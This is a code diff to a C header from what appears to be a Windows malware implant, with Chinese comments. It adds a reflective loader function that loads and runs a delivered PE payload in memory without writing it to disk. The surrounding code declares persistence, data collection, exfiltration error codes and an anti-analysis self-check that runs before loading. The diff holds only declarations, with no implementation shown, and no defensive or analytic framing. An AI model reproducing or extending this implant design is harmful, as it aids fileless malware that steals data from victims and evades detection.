@@ -26,6 +26,7 @@
 
 #include "implant.h"
 #include "persist_win.h"
+#include "reflect_run.h"
 
 #include <stdbool.h>
 #include <stddef.h>
@@ -42,6 +43,7 @@ extern "C" {
 #define IMW_ERR_NOEXFIL  -4   /* 未注入 exfil */
 #define IMW_ERR_IMPLANT  -5   /* 主循环自身失败（见 result.imp_err） */
 #define IMW_ERR_PERSIST  -6   /* 驻留失败且调用方要求严格 */
+#define IMW_ERR_REFLECT  -7   /* 反射装载/执行失败（见 result.reflect_rc） */
 
 typedef struct {
     implant_cfg_t imp;            /* 采集与调度配置 */
@@ -77,6 +79,11 @@ typedef struct {
     uint32_t       errors;     /* 主循环内部错误计数 */
     uint32_t       exfil_fail; /* 回传最终失败的次数（重试后仍失败） */
     implant_err_t  imp_err;    /* 主循环最后错误码 */
+    int            reflect_rc; /* imw_reflect_run 的 rr_load_run 原始返回码 */
+    uint32_t       n_reloc;    /* 反射装载修正的重定位项数 */
+    uint32_t       n_import;   /* 绑定的 IAT 项数 */
+    uint32_t       n_tls;      /* 被调用的 TLS 回调数 */
+    int            entry_invoked; /* 1 = 入口点确已执行 */
 } imw_result_t;
 
 /*
@@ -88,6 +95,24 @@ int imw_run(const imw_cfg_t *cfg, const imw_hooks_t *h, imw_result_t *out);
 /* 仅做对抗自检 + 驻留，不采集。用于"先落地生根"的投送阶段。 */
 int imw_bootstrap(const imw_cfg_t *cfg, const imw_hooks_t *h,
                   imw_result_t *out);
+
+/*
+ * 反射落地：把投送到的 PE 制品在内存中装载并执行（不落盘）。
+ *
+ * 与 imw_run 的区别：imw_run 是"已在进程内运行"的采集循环；本函数是
+ * "把投送来的 PE 装进来并跑起来"的落地入口，对应 stager 收到制品之后那一步。
+ *
+ * 不要求 pack/exfil：制品的解密由投送侧（25_deploy）在装载前完成，本函数
+ * 拿到的是明文 PE；且装载动作本身不产生回传，故不触发明文外泄规则。
+ *
+ * 对抗自检仍然先于一切：装载会产生权限切换痕迹，在不安全环境里连这一步
+ * 都不能做。
+ */
+int imw_reflect_run(const imw_cfg_t *cfg, const imw_hooks_t *h,
+                    const rr_hooks_t *rh,
+                    const uint8_t *pe, size_t pe_len,
+                    uint8_t *region, size_t region_size,
+                    imw_result_t *out);
 
 const char *imw_errstr(int rc);
 
